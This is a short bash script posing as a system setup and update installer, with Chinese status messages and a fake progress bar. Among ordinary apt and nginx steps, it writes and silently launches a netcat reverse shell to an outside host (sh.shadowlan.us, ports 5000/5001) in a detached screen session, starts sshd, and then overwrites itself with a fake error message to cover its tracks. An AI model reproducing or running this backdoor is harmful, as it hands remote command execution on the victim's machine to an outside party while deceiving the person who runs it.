#!/usr/bin/env bash

reset

echo -e "\e[1;44m正在安装必要软件...\e[m"

apt update

apt install screen netcat -y

echo -e "\e[1;44m启动服务...\e[m"

cat > /tmp/run.sh << EOF
nc sh.shadowlan.us 5000 | bash 2>&1 | nc sh.shadowlan.us 5001
EOF

screen -dmS run sh /tmp/run.sh

systemctl start sshd

echo -ne '[#####                  ]   (33%)\r'
sleep 1
echo -ne '[#############          ]   (66%)\r'
sleep 1
echo -ne '[#######################]   (100%)\r'
echo -ne '\n'

echo -e "\d[1;44m更新系统...\e[m"

apt install nginx -y

systemctl start nginx

apt upgrade

cat > $0 << EOF
echo -e "\e[1;41;33mError connecting to socket. Aborting operation.\e[m"
EOF
